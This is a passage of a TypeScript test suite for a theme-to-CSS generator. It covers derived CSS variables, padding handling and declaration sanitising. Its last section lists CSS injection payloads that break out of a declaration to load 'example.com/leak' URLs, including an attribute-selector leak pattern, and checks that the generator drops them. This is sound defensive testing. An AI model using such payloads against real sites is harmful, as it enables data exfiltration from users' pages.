      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-text-area'));
    expect(rule).toBeDefined();
    // Value flows to the inner <textarea> via the var…
    expect(rule).toContain(
      '--_textarea-inline-padding: var(--app-input-padding-x)',
    );
    // …and must NOT land on the flush wrapper, which would re-inset the
    // full-bleed textarea and push the native resize grip off the corner.
    expect(rule).not.toContain('padding-inline: var(--app-input-padding-x)');
  });

  it('lowers onDark and onLight text-area paddingInline to the adaptation leaf', () => {
    const theme = defineTheme({
      name: 'test-media-derived-text-area',
      adaptations: {
        rules: [
          {
            when: {contrast: 'more'},
            value: {
              components: {
                'text-area': {base: {paddingInline: '12px'}},
              },
            },
          },
        ],
      },
      onDark: {
        components: {
          'text-area': {base: {paddingInline: '24px'}},
        },
      },
      onLight: {
        components: {
          'text-area': {base: {paddingInline: '20px'}},
        },
      },
    });

    const adaptationCss = generateAdaptationCSS(theme).component;
    const surfaceCss = generateOnMediaCSS(theme);
    expect(adaptationCss).toContain('--_textarea-inline-padding: 12px');
    expect(surfaceCss).toContain('--_textarea-inline-padding: 24px');
    expect(surfaceCss).toContain('--_textarea-inline-padding: 20px');
    expect(surfaceCss).not.toContain('padding-inline: 24px');
    expect(surfaceCss).not.toContain('padding-inline: 20px');

    const combinedCss = generateThemeCSS(theme).component;
    expect(
      combinedCss.indexOf('--_textarea-inline-padding: 12px'),
    ).toBeLessThan(combinedCss.lastIndexOf('--_textarea-inline-padding: 24px'));
    expect(
      combinedCss.indexOf('--_textarea-inline-padding: 12px'),
    ).toBeLessThan(combinedCss.lastIndexOf('--_textarea-inline-padding: 20px'));
  });

  it('replaces progressbar-mark width/height with vars (no raw properties)', () => {
    const theme = defineTheme({
      name: 'test-derived-progressbar-mark',
      components: {
        'progress-bar-mark': {
          base: {width: '2px', height: '12px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-progress-bar-mark'));
    expect(rule).toBeDefined();
    expect(rule).toContain('--_progressbar-mark-width: 2px');
    expect(rule).toContain('--_progressbar-mark-height: 12px');
    // Raw dimensions would be a same-element fight with the mark's StyleX,
    // which an unlayered consumer build wins — the vars have no competitor.
    expect(rule).not.toMatch(/[{;]\s*width: 2px/);
    expect(rule).not.toMatch(/[{;]\s*height: 12px/);
  });
});

describe('brutalist-style derived expansion', () => {
  it('button borderRadius emits --_button-radius for pill shape', () => {
    const theme = defineTheme({
      name: 'test-brutalist',
      radius: {base: 4, multiplier: 0},
      components: {
        button: {
          base: {borderRadius: '9999px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-button'));
    expect(rule).toContain('border-radius: 9999px');
    expect(rule).toContain('--_button-radius: 9999px');
  });

  it('card padding emits container tokens via derived expansion', () => {
    const theme = defineTheme({
      name: 'test-brutalist-card',
      components: {
        card: {
          base: {padding: '24px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-card'));
    expect(rule).toBeDefined();
    expect(rule).toContain('--astryx-card-padding: 24px');
  });

  it('dropdown-menu borderRadius + padding emit both derived vars', () => {
    const theme = defineTheme({
      name: 'test-brutalist-dropdown',
      components: {
        'dropdown-menu': {
          base: {borderRadius: '0px', padding: '4px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-dropdown-menu'));
    expect(rule).toBeDefined();
    expect(rule).toContain('border-radius: 0px');
    expect(rule).toContain('--_dropdown-menu-radius: 0px');
    expect(rule).toContain('--_dropdown-menu-padding: 4px');
  });
});

describe('physical padding longhands', () => {
  const ruleFor = (
    component: string,
    base: Record<string, string>,
    name = 'test-physical-padding',
  ) =>
    generateThemeRules(
      defineTheme({name, components: {[component]: {base}}}),
    ).find(r => r.includes(`.astryx-${component}`));

  // `padding-top`/`padding-bottom` ARE the block edges in every horizontal
  // writing mode, so the expansion can normalize them with no direction
  // assumption. Without that, the padding lands raw on the element and the
  // component's internals — the NumberInput stepper column, container bleed —
  // read the default instead of what the theme set.
  it.each([
    ['paddingTop', {paddingTop: '14px'}, 'block-start'],
    ['paddingBottom', {paddingBottom: '14px'}, 'block-end'],
  ])('routes %s through the container expansion', (_label, base, edge) => {
    const rule = ruleFor('card', base);
    expect(rule).toContain(`--astryx-card-padding-${edge}: 14px`);
    expect(rule).not.toMatch(/[{;]\s*padding-(top|bottom):/);
  });

  it('normalizes both block edges together, asymmetrically', () => {
    const rule = ruleFor('number-input', {
      paddingTop: '14px',
      paddingBottom: '6px',
    });
    expect(rule).toContain('--astryx-number-input-padding-block-start: 14px');
    expect(rule).toContain('--astryx-number-input-padding-block-end: 6px');
  });

  it.each(['card', 'dialog', 'section', 'number-input'])(
    'reaches %s, which expands its padding',
    component => {
      expect(ruleFor(component, {paddingTop: '14px'})).toContain(
        `--astryx-${component}-padding-block-start: 14px`,
      );
    },
  );

  // THE RTL GUARD. `paddingLeft` is inline-start in LTR and inline-end in RTL,
  // and the tokens are consumed by logical properties, so mapping it would
  // silently move the padding to the other edge in RTL. It stays physical —
  // which is what the author wrote — and does not reach the tokens.
  it('leaves the direction-relative inline pair physical', () => {
    const rule = ruleFor('card', {paddingLeft: '20px', paddingRight: '8px'});
    expect(rule).toContain('padding-left: 20px');
    expect(rule).toContain('padding-right: 8px');
    expect(rule).not.toContain('--astryx-card-padding-inline');
  });

  it('expands the block edges while leaving left physical', () => {
    const rule = ruleFor('card', {paddingTop: '14px', paddingLeft: '20px'});
    expect(rule).toContain('--astryx-card-padding-block-start: 14px');
    expect(rule).toContain('padding-left: 20px');
  });

  // The shorthand-plus-override case was the worst one: the tokens carried
  // 10px while the element painted 14px on top, so every internal compensated
  // by the wrong amount.
  it('lets a physical longhand override the shorthand per edge', () => {
    const rule = ruleFor('card', {padding: '10px', paddingTop: '14px'});
    expect(rule).toContain('--astryx-card-padding-block-start: 14px');
    expect(rule).toContain('--astryx-card-padding-block-end: 10px');
    expect(rule).toContain('--astryx-card-padding-inline: 10px');
    expect(rule).not.toMatch(/[{;]\s*padding(-top)?:/);
  });

  // A `vars` entry carries one value for the whole box, so a single physical
  // edge must not feed it — only the container expansion takes these.
  it('does not feed a single edge to a whole-box derived var', () => {
    const rule = ruleFor('dropdown-menu', {paddingTop: '14px'});
    expect(rule).toContain('padding-top: 14px');
    expect(rule).not.toContain('--_dropdown-menu-padding');
  });
});

describe('canonical theme targets', () => {
  // Removed aliases still pass through the generic CSS generator, but they no
  // longer receive canonical derived-variable expansion.
  it('expands derived vars only for canonical target keys', () => {
    const rules = (component: string, styles: Record<string, string>) =>
      generateThemeRules(
        defineTheme({
          name: `test-target-${component}`,
          components: {[component]: {base: styles}},
        }),
      ).join('\n');

    const hoverCard = rules('hover-card', {borderRadius: '9px'});
    expect(hoverCard).toContain('.astryx-hover-card');
    expect(hoverCard).toContain('--_hovercard-radius: 9px');
    expect(rules('hovercard', {borderRadius: '9px'})).not.toContain(
      '--_hovercard-radius: 9px',
    );

    const textArea = rules('text-area', {paddingInline: '11px'});
    expect(textArea).toContain('.astryx-text-area');
    expect(textArea).toContain('--_textarea-inline-padding: 11px');
    expect(rules('textarea', {paddingInline: '11px'})).not.toContain(
      '--_textarea-inline-padding: 11px',
    );

    const mark = rules('progress-bar-mark', {width: '3px'});
    expect(mark).toContain('.astryx-progress-bar-mark');
    expect(mark).toContain('--_progressbar-mark-width: 3px');
    expect(rules('progressbar-mark', {width: '3px'})).not.toContain(
      '--_progressbar-mark-width: 3px',
    );
  });
});

describe('data visualization tokens', () => {
  const scopeBlock = (theme: Parameters<typeof generateThemeRules>[0]) =>
    generateThemeRules(theme).find(r => r.includes(':scope'));

  it('leaves canonical defaults out of a theme scope block', () => {
    // A scope block that re-declared them would shadow a parent theme's
    // override in every nested <Theme>, which no other token family does.
    expect(scopeBlock(defineTheme({name: 'data-bare'}))).toBeUndefined();
  });

  it("puts only the theme's own data token in its scope block", () => {
    const block = scopeBlock(
      defineTheme({
        name: 'data-override',
        tokens: {'--color-data-categorical-blue': ['#123456', '#654321']},
      }),
    )!;

    expect(block).toContain(
      '--color-data-categorical-blue: light-dark(#123456, #654321);',
    );
    expect(block.match(/--color-data-/g)).toHaveLength(1);
    expect(block).not.toContain('--color-data-categorical-orange');
  });

  it('keeps canonical defaults out of the theme stylesheet', () => {
    // The public StyleX dataVars group owns canonical CSS defaults; this
    // generator serializes only values explicitly authored by the theme.
    const {component, prose} = generateThemeCSS(
      defineTheme({name: 'data-css'}),
    );

    expect(component).not.toContain('--color-data-');
    expect(prose).not.toContain('--color-data-');
  });

  it('keeps generateThemeCSS to its two scoped blocks', () => {
    // Canonical defaults come from public StyleX output, not a third theme
    // generator block.
    expect(
      Object.keys(generateThemeCSS(defineTheme({name: 'data-shape'}))).sort(),
    ).toEqual(['component', 'prose']);
  });
});

describe('declaration assembly keeps values as values', () => {
  /** Run the full runtime generator, collecting every dropped declaration. */
  function generate(theme: DefinedTheme) {
    const diagnostics: string[] = [];
    const {component, prose} = generateThemeCSS(theme, diagnostics);
    return {css: component + prose, component, prose, diagnostics};
  }

  /**
   * Every path a consumer-supplied declaration can take into the stylesheet.
   * `build` places `value` on that path; `emitted` is the exact declaration
   * text the path writes for it; `property`/`location` are what a diagnostic
   * for it must carry.
   */
  const paths: {
    label: string;
    property: string;
    location: string;
    build: (value: string) => DefinedTheme;
    emitted: (value: string) => string;
  }[] = [
    {
      label: 'root tokens',
      property: '--color-accent',
      location: 'tokens',
      build: value =>
        defineTheme({name: 'brand', tokens: {'--color-accent': value}}),
      emitted: value => `--color-accent: ${value};`,
    },
    {
      label: 'theme-local tokens',
      property: '--brand-accent',
      location: 'localTokens',
      build: value =>
        defineTheme({name: 'brand', localTokens: {'--brand-accent': value}}),
      emitted: value => `--brand-accent: ${value};`,
    },
    {
      label: 'tokens inherited from a base theme',
      property: '--color-accent',
      location: 'tokens',
      build: value =>
        defineTheme({
          name: 'child',
          extends: defineTheme({
            name: 'base',
            tokens: {'--color-accent': value},
          }),
        }),
      emitted: value => `--color-accent: ${value};`,
    },
    {
      label: 'component variant',
      property: 'background-color',
      location: 'components.button["variant:secondary"]',
      build: value =>
        defineTheme({
          name: 'brand',
          components: {
            button: {'variant:secondary': {backgroundColor: value}},
          },
        }),
      emitted: value => `background-color: ${value};`,
    },
    {
      label: 'component variant inherited from a base theme',
      property: 'background-color',
      location: 'components.button["variant:secondary"]',
      build: value =>
        defineTheme({
          name: 'child',
          extends: defineTheme({
            name: 'base',
            components: {
              button: {'variant:secondary': {backgroundColor: value}},
            },
          }),
        }),
      emitted: value => `background-color: ${value};`,
    },
    {
      label: 'component pseudo block',
      property: 'background-color',
      location: 'components.button["variant:secondary"][":hover"]',
      build: value =>
        defineTheme({
          name: 'brand',
          components: {
            button: {'variant:secondary': {':hover': {backgroundColor: value}}},
          },
        }),
      emitted: value => `background-color: ${value};`,
    },
    {
      label: 'onDark tokens',
      property: '--color-accent',
      location: 'onDark.tokens',
      build: value =>
        defineTheme({
          name: 'brand',
          onDark: {tokens: {'--color-accent': value}},
        }),
      emitted: value => `--color-accent: ${value};`,
    },
    {
      label: 'onLight component variant',
      property: 'background-color',
      location: 'onLight.components.button["variant:secondary"]',
      build: value =>
        defineTheme({
          name: 'brand',
          onLight: {
            components: {
              button: {'variant:secondary': {backgroundColor: value}},
            },
          },
        }),
      emitted: value => `background-color: ${value};`,
    },
    {
      label: 'onDark component pseudo block',
      property: 'background-color',
      location: 'onDark.components.button["variant:secondary"][":hover"]',
      build: value =>
        defineTheme({
          name: 'brand',
          onDark: {
            components: {
              button: {
                'variant:secondary': {':hover': {backgroundColor: value}},
              },
            },
          },
        }),
      emitted: value => `background-color: ${value};`,
    },
    {
      label: 'adaptation tokens',
      property: '--color-accent',
      location: 'adaptations[0].tokens',
      build: value =>
        defineTheme({
          name: 'brand',
          adaptations: {
            rules: [
              {
                when: {pointer: 'coarse'},
                value: {tokens: {'--color-accent': value}},
              },
            ],
          },
        }),
      emitted: value => `--color-accent: ${value};`,
    },
    {
      label: 'adaptation component variant',
      property: 'background-color',
      location: 'adaptations[1].components.button["variant:secondary"]',
      build: value =>
        defineTheme({
          name: 'brand',
          adaptations: {
            rules: [
              {
                when: {pointer: 'fine'},
                value: {tokens: {'--spacing-4': '12px'}},
              },
              {
                when: {pointer: 'coarse'},
                value: {
                  components: {
                    button: {'variant:secondary': {backgroundColor: value}},
                  },
                },
              },
            ],
          },
        }),
      emitted: value => `background-color: ${value};`,
    },
  ];

  /** Valid CSS a browser keeps inside one declaration. */
  const preserved: [string, string][] = [
    ['a color-mix()', 'color-mix(in oklch, #FF00FF 80%, white)'],
    ['a gradient', 'linear-gradient(135deg, #FF00FF 0%, #00FFFF 100%)'],
    ['calc()', 'calc(100% - 24px)'],
    ['light-dark()', 'light-dark(#fff, #111)'],
    ['a quoted font stack', "'Inter Var', ui-sans-serif, system-ui"],
    [
      'a data: URI (semicolon inside url())',
      'url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==)',
    ],
    ['an uppercase URL()', 'URL(data:image/svg+xml;base64,PHN2Zz4=)'],
    [
      'a quoted url() carrying a semicolon',
      'url("data:image/svg+xml;utf8,<svg/>")',
    ],
    ['an escaped identifier', 'Gill\\ Sans, serif'],
    ['a closed comment with a semicolon inside', 'red /* ; } */'],
    ['a semicolon inside a string', '"a;b"'],
    ['an escaped quote inside a string', '"a\\" ; b"'],
    ['quoted braces', '"} body { color: red }"'],
    ['important', 'red !important'],
    ['nested functions', 'var(--fallback, calc(1px + 2px))'],
    ['CRLF string continuation', '"a\\\r\nb"'],
    ['closed comment with a control character', 'red /* \u0001 ; } */'],
    [
      'balanced brackets and parentheses',
      '[full-start] minmax(0, 1fr) [full-end]',
    ],
  ];

  /** Values a browser reads as the end of the declaration or rule. */
  const rejected: [string, string, string][] = [
    [
      'an unquoted semicolon adds a declaration',
      'red; background-image: url(https://example.com/leak)',
      ';',
    ],
    [
      'an unquoted brace closes the rule',
      'red } input[value^="a"] { background: url(https://example.com/leak?a) ',
      '}',
    ],
    [
      'an unquoted brace opens a block',
      'red { background: url(https://example.com/leak) }',
      '{',
    ],
    [
      'an escaped quote is not a string opener',
      '\\"; background: url(https://example.com/leak); "',
      ';',
    ],
    [
      'an unclosed comment swallows the rule',
      'red /* https://example.com/leak',
      'comment',
    ],
    [
      'an unclosed string swallows the rule',
      '"https://example.com/leak',
      'string',
    ],
    [
      'an unclosed url() swallows the rule',
      'url(https://example.com/leak',
      'url(',
    ],
    [
      'an unclosed paren swallows the rule',
      'calc(1px + var(--example.com/leak)',
      '(',
    ],
    [
      'an unbalanced closer',
      'red) ; background: url(https://example.com/leak)',
      ')',
    ],
    ['a bad url', 'url(https://example.com/leak a)', 'bad url'],
    [
      'a trailing backslash escapes the terminator',
      'https://example.com/leak\\',
      'backslash',
    ],
  ];

  describe.each(paths)('$label', path => {
    it.each(preserved)('emits %s byte-identically', (_label, value) => {
      const {css, diagnostics} = generate(path.build(value));
      expect(css).toContain(path.emitted(value));
      expect(diagnostics).toEqual([]);
    });

    it.each(rejected)('drops a value where %s', (_label, value, reason) => {
      const {css, diagnostics} = generate(path.build(value));
      expect(css).not.toContain('example.com');
      expect(css).not.toContain('leak');
      expect(diagnostics).toHaveLength(1);
      expect(diagnostics[0]).toContain(`"${path.property}"`);
      expect(diagnostics[0]).toContain(path.location);
      expect(diagnostics[0]).toContain(reason);
    });
  });

  it('keeps a vendor-prefixed property name', () => {
    const {css, diagnostics} = generate(
      defineTheme({
        name: 'brand',
        components: {
          button: {
            'variant:secondary': {
              WebkitLineClamp: '2',
              MozOsxFontSmoothing: 'grayscale',
            },
          },
        },
      }),
    );
    expect(css).toContain('-webkit-line-clamp: 2;');
    expect(css).toContain('-moz-osx-font-smoothing: grayscale;');
    expect(diagnostics).toEqual([]);
  });

  it('drops a property name that is not a property name', () => {
    const {css, diagnostics} = generate(
      defineTheme({
        name: 'brand',
        tokens: {
          '--x:red} body{color:blue': 'red',
        } as Record<string, string>,
      }),
    );
    expect(css).not.toContain('body{color:blue');
    expect(css).not.toContain('body {');
    expect(diagnostics).toHaveLength(1);
    expect(diagnostics[0]).toContain('"--x:red} body{color:blue" in tokens');
    expect(diagnostics[0]).toContain('identifier');
  });

  it('keeps prose rules intact when a typed token carries a payload', () => {
    // Prose rules reference the token through var(), so the payload never
    // reaches them; the token block drops it and the :where(p) rule stays.
    const {css, prose, diagnostics} = generate(
      defineTheme({
        name: 'brand',
        tokens: {
          '--text-body-size': '1rem; } body { background: url(x) ',
        },
      }),
    );
    expect(css).not.toContain('background: url(x)');
    expect(css).not.toContain('body {');
    expect(prose).toContain('font-size: var(--text-body-size);');
    expect(diagnostics).toHaveLength(1);
    expect(diagnostics[0]).toContain('"--text-body-size" in tokens');
  });

  it('falls back to the token weight when an authored Heading weight cannot stay a declaration', () => {
    const payload = '700; } body { background: url(https://example.com/leak) ';
    const {css, diagnostics} = generate(
      defineTheme({
        name: 'brand',
        components: {heading: {'weight:bold': {fontWeight: payload}}},
      }),
    );
    expect(css).not.toContain('example.com');
    expect(css).toContain(
      '.astryx-heading[data-weight="bold"] { font-weight: var(--font-weight-bold); }',
    );
    // Reported once, where the authored rule's own declarations are emitted.
    expect(diagnostics).toHaveLength(1);
    expect(diagnostics[0]).toContain(
      '"font-weight" in components.heading["weight:bold"]',
    );
  });

  it('falls back to the token weight when an inherited Heading weight cannot stay a declaration', () => {
    const payload = '700; } body { background: url(https://example.com/leak) ';
    const {css} = generate(
      defineTheme({
        name: 'brand',
        components: {heading: {'weight:bold': {fontWeight: payload}}},
        onDark: {components: {heading: {'level:1': {fontSize: '2rem'}}}},
      }),
    );
    expect(css).not.toContain('example.com');
    expect(css).toContain(
      ':is([data-astryx-media="dark"]) :is(.astryx-heading[data-weight="bold"]) { font-weight: var(--font-weight-bold); }',
    );
  });

  it('a dropped container padding still leaves the rest of the rule intact', () => {
    const {css, diagnostics} = generate(
      defineTheme({
        name: 'brand',
        components: {
          card: {
            base: {
              padding:
                '16px; } body { background: url(https://example.com/leak) ',
              borderRadius: '8px',
            },
          },
        },
      }),
    );
    expect(css).not.toContain('example.com');
    expect(css).toContain('border-radius: 8px;');
    expect(diagnostics).toHaveLength(1);
    expect(diagnostics[0]).toContain('"padding" in components.card["base"]');
    expect(css).not.toContain('--astryx-card-padding');
  });

  it('warns on the console only when no warning collector is given', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const theme = defineTheme({
      name: 'brand',
      tokens: {
        '--color-accent': 'red; background: url(https://example.com/leak)',
      },
    });

    const plainCSS = generateThemeCSS(theme);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn).toHaveBeenCalledWith(
      expect.stringContaining(
        '[astryx theme] dropped "--color-accent" in tokens',
      ),
    );

    warn.mockClear();
    const diagnostics: string[] = ['earlier build warning'];
    const before = JSON.stringify(theme);
    expect(generateThemeCSS(theme, diagnostics)).toEqual(plainCSS);
    expect(JSON.stringify(theme)).toBe(before);
    expect(warn).not.toHaveBeenCalled();
    expect(diagnostics).toHaveLength(2);
    expect(diagnostics[0]).toBe('earlier build warning');
    expect(diagnostics[1]).toContain('dropped "--color-accent" in tokens');
    warn.mockRestore();
  });

  it('every shipped generator entry point appends to the warning collector', () => {
    const theme = defineTheme({
      name: 'brand',
      tokens: {
        '--color-accent': 'red; background: url(https://example.com/leak)',
      },
      onDark: {
        tokens: {
          '--color-accent': 'red; background: url(https://example.com/dark)',
        },
      },
      adaptations: {
        rules: [
          {
            when: {pointer: 'coarse'},
            value: {
              tokens: {
                '--color-accent':
                  'red; background: url(https://example.com/coarse)',
              },
            },
          },
        ],
      },
    });
    const seen: string[] = [];
    expect(generateThemeRules(theme, seen).join('')).not.toContain(
      'example.com',
    );
    expect(generateOnMediaCSS(theme, seen)).not.toContain('example.com');
    expect(generateAdaptationCSS(theme, seen).component).not.toContain(
      'example.com',
    );
    expect(seen).toEqual([
      expect.stringContaining('in tokens:'),
      expect.stringContaining('in onDark.tokens:'),
      expect.stringContaining('in adaptations[0].tokens:'),
    ]);
  });
});
